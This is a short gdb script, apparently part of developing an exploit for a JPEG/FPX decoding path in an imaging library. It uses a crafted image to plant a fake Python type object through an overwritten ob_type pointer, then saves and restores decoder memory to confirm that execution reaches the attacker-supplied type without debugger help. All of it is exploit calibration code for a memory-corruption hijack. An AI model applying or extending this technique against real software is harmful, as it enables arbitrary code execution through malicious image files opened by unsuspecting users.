# W7 dynamic-address variant: the fake type is supplied entirely by the
# crafted FPX image. gdb copies NO host type, sets NO slot, and assumes NO
# absolute brk address: the target address is read from the image-written
# ob_type pointer at $b+184. Scratch: /tmp/pw2-w7cal.
set breakpoint pending on
set pagination off
break ImagingJpegDecode
run
set $b=(unsigned char*)state->buffer
dump binary memory /tmp/pw2-w7cal/pre1.bin $b+128 $b+184
dump binary memory /tmp/pw2-w7cal/pre2.bin $b+192 $b+1024
printf "SAVED type=%lx\n",*(unsigned long*)($b+184)
finish
set $f=(unsigned char*)*(unsigned long*)($b+184)
dump binary memory /tmp/pw2-w7cal/img_fake.bin $f $f+416
dump binary memory /tmp/pw2-w7cal/img_ptr.bin $b+184 $b+192
restore /tmp/pw2-w7cal/pre1.bin binary $b+128
restore /tmp/pw2-w7cal/pre2.bin binary $b+192
restore /tmp/pw2-w7cal/img_fake.bin binary $f
restore /tmp/pw2-w7cal/img_ptr.bin binary $b+184
printf "PTR184=%lx FAKE48=%lx MATCH=%d\n",*(unsigned long*)($b+184),*(unsigned long*)($f+48),*(unsigned long*)($b+184)==$f
break *0x45e6e6
printf "CONTINUE NATURAL (no gdb-set type or slot)\n"
continue
printf "HIT pc=%p\n",$pc
bt 8
info registers rdi
